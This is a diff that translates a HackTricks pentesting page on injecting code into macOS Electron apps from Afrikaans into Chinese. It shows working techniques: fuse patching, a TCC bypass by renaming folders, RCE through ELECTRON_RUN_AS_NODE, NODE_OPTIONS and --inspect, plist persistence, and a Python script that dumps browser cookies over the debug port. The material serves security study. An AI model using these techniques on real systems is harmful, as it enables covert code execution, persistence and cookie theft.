@@ -1,42 +1,42 @@
-# macOS Electron-toepassingsinspuiting
+# macOS Electron 应用程序注入
 
 {% hint style="success" %}
-Leer en oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer en oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Controleer de [**abonnementsplannen**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
 
-## Basiese Inligting
+## 基本信息
 
-As jy nie weet wat Electron is nie, kan jy [**baie inligting hier vind**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Maar vir nou moet jy net weet dat Electron **node** laat loop.\
-En node het sekere **parameters** en **omgewingsveranderlikes** wat gebruik kan word om **dit ander kode te laat uitvoer** as die aangeduide lêer.
+如果你不知道 Electron 是什么，你可以在 [**这里找到很多信息**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)。但现在只需知道 Electron 运行 **node**。\
+而 node 有一些 **参数** 和 **环境变量** 可以用来 **执行其他代码**，而不仅仅是指定的文件。
 
-### Electron-smeulstowwe
+### Electron 保险丝
 
-Hierdie tegnieke sal later bespreek word, maar onlangs het Electron verskeie **sekuriteitsvlaggies bygevoeg om hulle te voorkom**. Dit is die [**Electron-smeulstowwe**](https://www.electronjs.org/docs/latest/tutorial/fuses) en dit is diegene wat gebruik word om Electron-toepassings in macOS te **verhoed om arbitrêre kode te laai**:
+这些技术将在接下来讨论，但最近 Electron 添加了几个 **安全标志以防止它们**。这些是 [**Electron 保险丝**](https://www.electronjs.org/docs/latest/tutorial/fuses)，用于 **防止** macOS 中的 Electron 应用程序 **加载任意代码**：
 
-* **`RunAsNode`**: As dit gedeaktiveer is, voorkom dit die gebruik van die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** om kode in te spuit.
-* **`EnableNodeCliInspectArguments`**: As dit gedeaktiveer is, sal parameters soos `--inspect`, `--inspect-brk` nie gerespekteer word nie. Dit verhoed sodoende die inspuiting van kode.
-* **`EnableEmbeddedAsarIntegrityValidation`**: As dit geaktiveer is, sal die gelaai **`asar`-lêer** deur macOS **gevalideer** word. Dit verhoed op hierdie manier **kode-inspuiting** deur die inhoud van hierdie lêer te wysig.
-* **`OnlyLoadAppFromAsar`**: As dit geaktiveer is, sal dit slegs die `app.asar` ondersoek en gebruik in plaas van om in die volgende volgorde te soek: **`app.asar`**, **`app`** en uiteindelik **`default_app.asar`**. Dit verseker dat wanneer dit **gekombineer** word met die **`embeddedAsarIntegrityValidation`**-smeulstof dit **onmoontlik** is om **nie-gevalideerde kode te laai**.
-* **`LoadBrowserProcessSpecificV8Snapshot`**: As dit geaktiveer is, gebruik die blaaierproses die lêer genaamd `browser_v8_context_snapshot.bin` vir sy V8-snapshot.
+* **`RunAsNode`**：如果禁用，它会阻止使用环境变量 **`ELECTRON_RUN_AS_NODE`** 来注入代码。
+* **`EnableNodeCliInspectArguments`**：如果禁用，参数如 `--inspect`、`--inspect-brk` 将不被尊重。避免通过这种方式注入代码。
+* **`EnableEmbeddedAsarIntegrityValidation`**：如果启用，加载的 **`asar`** **文件** 将由 macOS **验证**。以此方式 **防止** 通过修改该文件的内容进行 **代码注入**。
+* **`OnlyLoadAppFromAsar`**：如果启用，它将只检查并使用 app.asar，而不是按以下顺序加载：**`app.asar`**、**`app`**，最后是 **`default_app.asar`**。因此确保当与 **`embeddedAsarIntegrityValidation`** 保险丝结合时，**不可能** **加载未验证的代码**。
+* **`LoadBrowserProcessSpecificV8Snapshot`**：如果启用，浏览器进程将使用名为 `browser_v8_context_snapshot.bin` 的文件作为其 V8 快照。
 
-'n Ander interessante smeulstof wat nie kode-inspuiting sal voorkom nie, is:
+另一个有趣的保险丝不会防止代码注入：
 
-* **EnableCookieEncryption**: As dit geaktiveer is, word die koekie-stoor op skyf met OS-vlak kriptografie sleutels geënkripteer.
+* **EnableCookieEncryption**：如果启用，磁盘上的 cookie 存储将使用操作系统级别的加密密钥进行加密。
 
-### Kontroleer Electron-smeulstowwe
+### 检查 Electron 保险丝
 
-Jy kan **hierdie vlae kontroleer** vanuit 'n toepassing met:
+你可以通过以下方式从应用程序 **检查这些标志**：
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
 
@@ -50,47 +50,47 @@ EnableEmbeddedAsarIntegrityValidation is Enabled
 OnlyLoadAppFromAsar is Enabled
 LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
-### Wysiging van Electron-sekeringe
+### 修改 Electron Fuses
 
-Soos die [**dokumente aandui**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), word die konfigurasie van die **Electron-sekeringe** ingestel binne die **Electron-binêre lêer** wat êrens die string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** bevat.
+正如 [**文档提到的**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)，**Electron Fuses** 的配置是在 **Electron 二进制文件** 内部配置的，该文件中包含字符串 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**。
 
-In macOS-toepassings is dit tipies in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
+在 macOS 应用程序中，这通常位于 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
 ```bash
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-Jy kan hierdie lêer in [https://hexed.it/](https://hexed.it/) laai en soek na die vorige string. Na hierdie string kan jy in ASCII 'n nommer "0" of "1" sien wat aandui of elke fuus gedeaktiveer of geaktiveer is. Wysig net die hekskode (`0x30` is `0` en `0x31` is `1`) om **die fuuswaardes te wysig**.
+您可以在 [https://hexed.it/](https://hexed.it/) 中加载此文件并搜索前面的字符串。在此字符串后，您可以在 ASCII 中看到数字 "0" 或 "1"，指示每个保险丝是禁用还是启用。只需修改十六进制代码（`0x30` 是 `0`，`0x31` 是 `1`）以 **修改保险丝值**。
 
 <figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
 
-Merk op dat as jy probeer om die **`Electron Framework` binêre lêer** binne 'n toepassing met hierdie gewysigde bytes te **owerwrite**, sal die toepassing nie loop nie.
+请注意，如果您尝试用这些修改过的字节 **覆盖** 应用程序中的 **`Electron Framework`** 二进制文件，则该应用程序将无法运行。
 
-## RCE kode byvoeg tot Electron-toepassings
+## RCE 向 Electron 应用程序添加代码
 
-Daar kan **eksterne JS/HTML-lêers** wees wat 'n Electron-toepassing gebruik, sodat 'n aanvaller kode in hierdie lêers kan inspuit waarvan die handtekening nie nagegaan sal word nie en arbitrêre kode in die konteks van die toepassing kan uitvoer.
+可能有 **外部 JS/HTML 文件** 被 Electron 应用程序使用，因此攻击者可以在这些文件中注入代码，这些文件的签名不会被检查，并在应用程序的上下文中执行任意代码。
 
 {% hint style="danger" %}
-Daar is egter tans 2 beperkings:
+但是，目前有两个限制：
 
-* Die **`kTCCServiceSystemPolicyAppBundles`** toestemming is **nodig** om 'n toepassing te wysig, dus is dit standaard nie meer moontlik nie.
-* Die saamgestelde **`asap`** lêer het gewoonlik die fuise **`embeddedAsarIntegrityValidation`** `en` **`onlyLoadAppFromAsar`** `geaktiveer`
+* 修改应用程序需要 **`kTCCServiceSystemPolicyAppBundles`** 权限，因此默认情况下这不再可能。
+* 编译后的 **`asap`** 文件通常具有 **`embeddedAsarIntegrityValidation`** 和 **`onlyLoadAppFromAsar`** 保险丝 **启用**
 
-Dit maak hierdie aanvalspad meer ingewikkeld (of onmoontlik).
+这使得攻击路径更加复杂（或不可能）。
 {% endhint %}
 
-Merk op dat dit moontlik is om die vereiste van **`kTCCServiceSystemPolicyAppBundles`** te omseil deur die toepassing na 'n ander gids te kopieer (soos **`/tmp`**), die vouer **`app.app/Contents`** te hernoem na **`app.app/NotCon`**, die **asar** lêer met jou **skadelike** kode te **wysig**, dit terug te hernoem na **`app.app/Contents`** en dit uit te voer.
+请注意，可以通过将应用程序复制到另一个目录（如 **`/tmp`**），将文件夹 **`app.app/Contents`** 重命名为 **`app.app/NotCon`**，**修改** **asar** 文件以包含您的 **恶意** 代码，然后将其重命名回 **`app.app/Contents`** 并执行它，从而绕过 **`kTCCServiceSystemPolicyAppBundles`** 的要求。
 
-Jy kan die kode uit die asar-lêer uitpak met:
+您可以使用以下命令从 asar 文件中解压代码：
 ```bash
 npx asar extract app.asar app-decomp
 ```
-En pak dit terug nadat dit gewysig is met:
+并在修改后重新打包：
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
-## RCE met `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
+## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
-Volgens [**die dokumente**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), as hierdie omgewingsveranderlike ingestel is, sal dit die proses begin as 'n normale Node.js-proses.
+根据[**文档**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)，如果设置了这个环境变量，它将以普通的 Node.js 进程启动该进程。
 
 {% code overflow="wrap" %}
 ```bash
@@ -102,12 +102,12 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-As die **`RunAsNode`**-siklus uitgeskakel is, sal die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** geïgnoreer word, en dit sal nie werk nie.
+如果熔断器 **`RunAsNode`** 被禁用，环境变量 **`ELECTRON_RUN_AS_NODE`** 将被忽略，这将不起作用。
 {% endhint %}
 
-### Inspruiting van die App Plist
+### 从应用程序 Plist 注入
 
-Soos [**voorgestel hier**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), kan jy hierdie omgewingsveranderlike misbruik in 'n plist om volharding te handhaaf:
+如 [**这里提到的**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)，您可以在 plist 中滥用此环境变量以保持持久性：
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -131,9 +131,9 @@ Soos [**voorgestel hier**](https://www.trustedsec.com/blog/macos-injection-via-t
 </dict>
 </plist>
 ```
-## RCE met `NODE_OPTIONS`
+## RCE with `NODE_OPTIONS`
 
-Jy kan die lading in 'n ander lêer stoor en dit uitvoer:
+您可以将有效负载存储在不同的文件中并执行它： 
 
 {% code overflow="wrap" %}
 ```bash
@@ -146,14 +146,14 @@ NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Di
 {% endcode %}
 
 {% hint style="danger" %}
-As die smeltkroes **`EnableNodeOptionsEnvironmentVariable`** is **uitgeskakel**, sal die app die omgewingsveranderlike **NODE_OPTIONS** ignoreer wanneer dit begin word tensy die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** ingestel is, wat ook **ignoreer** sal word as die smeltkroes **`RunAsNode`** uitgeskakel is.
+如果熔断器 **`EnableNodeOptionsEnvironmentVariable`** 被 **禁用**，则应用在启动时将 **忽略** 环境变量 **NODE\_OPTIONS**，除非环境变量 **`ELECTRON_RUN_AS_NODE`** 被设置，如果熔断器 **`RunAsNode`** 被禁用，该变量也将被 **忽略**。
 
-As jy nie **`ELECTRON_RUN_AS_NODE`** instel nie, sal jy die **fout** kry: `Meeste NODE_OPTIONs word nie ondersteun in gepakde programme nie. Sien dokumentasie vir meer besonderhede.`
+如果您不设置 **`ELECTRON_RUN_AS_NODE`**，您将会发现 **错误**：`Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
 {% endhint %}
 
-### Inspruiting van die App Plist
+### 从应用程序 Plist 注入
 
-Jy kan hierdie omgewingsveranderlike misbruik in 'n plist om volharding te behou deur hierdie sleutels by te voeg:
+您可以在 plist 中滥用此环境变量以保持持久性，添加这些键：
 ```xml
 <dict>
 <key>EnvironmentVariables</key>
@@ -169,10 +169,10 @@ Jy kan hierdie omgewingsveranderlike misbruik in 'n plist om volharding te behou
 <true/>
 </dict>
 ```
-## RCE met inspeksie
+## RCE with inspecting
 
-Volgens [**hierdie**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) artikel, as jy 'n Electron-toepassing uitvoer met vlae soos **`--inspect`**, **`--inspect-brk`** en **`--remote-debugging-port`**, sal 'n **debuutpoort oop wees** sodat jy daarmee kan verbind (byvoorbeeld vanaf Chrome in `chrome://inspect`) en jy sal in staat wees om **kode daarin in te spuit** of selfs nuwe prosesse te begin.\
-Byvoorbeeld:
+根据[**这篇文章**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)，如果你使用 **`--inspect`**、**`--inspect-brk`** 和 **`--remote-debugging-port`** 等标志执行一个 Electron 应用程序，**调试端口将会打开**，这样你就可以连接到它（例如从 Chrome 的 `chrome://inspect`）并且你将能够**在其上注入代码**，甚至启动新的进程。\
+例如： 
 
 {% code overflow="wrap" %}
 ```bash
@@ -183,14 +183,14 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Indien die **`EnableNodeCliInspectArguments`**-fusie gedeaktiveer is, sal die app **node parameters ignoreer** (soos `--inspect`) wanneer dit begin word tensy die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** ingestel is, wat ook **ignoreer** sal word as die **`RunAsNode`**-fusie gedeaktiveer is.
+如果熔断器 **`EnableNodeCliInspectArguments`** 被禁用，应用程序在启动时将 **忽略节点参数**（如 `--inspect`），除非环境变量 **`ELECTRON_RUN_AS_NODE`** 被设置，如果熔断器 **`RunAsNode`** 被禁用，该变量也将被 **忽略**。
 
-Nogtans kan jy steeds die **electron param `--remote-debugging-port=9229`** gebruik, maar die vorige lading sal nie werk om ander prosesse uit te voer nie.
+然而，您仍然可以使用 **electron 参数 `--remote-debugging-port=9229`**，但之前的有效载荷将无法执行其他进程。
 {% endhint %}
 
-Deur die param **`--remote-debugging-port=9222`** te gebruik, is dit moontlik om sekere inligting van die Electron App te steel soos die **geskiedenis** (met GET-opdragte) of die **koekies** van die webblaaier (aangesien hulle binne die webblaaier **gedekripteer** word en daar 'n **json eindpunt** is wat hulle sal gee).
+使用参数 **`--remote-debugging-port=9222`** 可以从 Electron 应用程序中窃取一些信息，如 **历史记录**（使用 GET 命令）或浏览器的 **cookies**（因为它们在浏览器内部是 **解密** 的，并且有一个 **json 端点** 可以提供它们）。
 
-Jy kan leer hoe om dit te doen [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) en [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) en die outomatiese instrument [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) gebruik of 'n eenvoudige skrips soos:
+您可以在 [**这里**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) 和 [**这里**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) 学习如何做到这一点，并使用自动工具 [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) 或像这样的简单脚本：
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -198,11 +198,11 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-In [**hierdie blogpos**](https://hackerone.com/reports/1274695), word hierdie foutopsporing misbruik om 'n headless chrome **willekeurige lêers op willekeurige plekke af te laai**.
+在[**这篇博客**](https://hackerone.com/reports/1274695)中，这种调试被滥用以使无头 Chrome **在任意位置下载任意文件**。
 
-### Inspruiting vanaf die App Plist
+### 从应用程序 Plist 注入
 
-Jy kan hierdie omgewingsveranderlike misbruik in 'n plist om volhoubaarheid by te voeg deur hierdie sleutels:
+您可以在 plist 中滥用此环境变量，通过添加这些键来保持持久性：
 ```xml
 <dict>
 <key>ProgramArguments</key>
@@ -216,22 +216,22 @@ Jy kan hierdie omgewingsveranderlike misbruik in 'n plist om volhoubaarheid by t
 <true/>
 </dict>
 ```
-## TCC Oorspeling deur Ouer Weergawes te misbruik
+## TCC 绕过利用旧版本
 
 {% hint style="success" %}
-Die TCC daemon van macOS kontroleer nie die uitgevoerde weergawe van die aansoek nie. As jy dus nie kode kan inspuit in 'n Electron-aansoek nie met enige van die vorige tegnieke nie, kan jy 'n vorige weergawe van die toepassing aflaai en kode daarin inspuit, aangesien dit steeds die TCC-voorregte sal kry (tensy die Trust Cache dit voorkom).
+macOS 的 TCC 守护进程不会检查应用程序的执行版本。因此，如果你 **无法在 Electron 应用程序中注入代码**，你可以下载该应用的旧版本并在其上注入代码，因为它仍然会获得 TCC 权限（除非信任缓存阻止它）。
 {% endhint %}
 
-## Voer nie-JS-kode uit
+## 运行非 JS 代码
 
-Die vorige tegnieke sal jou in staat stel om **JS-kode binne die proses van die Electron-aansoek** uit te voer. Onthou egter dat die **kindprosesse onder dieselfde sandbakkieprofiel** as die oueraansoek loop en **hul TCC-toestemmings erf**.\
-Daarom, as jy voorregte wil misbruik om byvoorbeeld toegang tot die kamera of mikrofoon te verkry, kan jy net **'n ander binêre lêer vanuit die proses uitvoer**.
+之前的技术将允许你在 **Electron 应用程序的进程中运行 JS 代码**。然而，请记住，**子进程在与父应用程序相同的沙箱配置文件下运行**，并且 **继承它们的 TCC 权限**。\
+因此，如果你想利用权限访问摄像头或麦克风，例如，你可以直接 **从进程中运行另一个二进制文件**。
 
-## Outomatiese Inspruiting
+## 自动注入
 
-Die instrument [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kan maklik gebruik word om **kwesbare Electron-aansoeke** wat geïnstalleer is, te vind en kode daarin in te spuit. Hierdie instrument sal probeer om die **`--inspect`** tegniek te gebruik:
+工具 [**electroniz3r**](https://github.com/r3ggi/electroniz3r) 可以轻松用于 **查找已安装的易受攻击的 Electron 应用程序** 并在其上注入代码。该工具将尝试使用 **`--inspect`** 技术：
 
-Jy moet dit self saamstel en kan dit so gebruik:
+你需要自己编译它，可以这样使用：
 ```bash
 # Find electron apps
 ./electroniz3r list-apps
@@ -267,23 +267,23 @@ You can now kill the app using `kill -9 57739`
 The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
 Shell binding requested. Check `nc 127.0.0.1 12345`
 ```
-## Verwysings
+## 参考文献
 
 * [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
 * [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
 * [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)
 
 {% hint style="success" %}
-Leer & oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
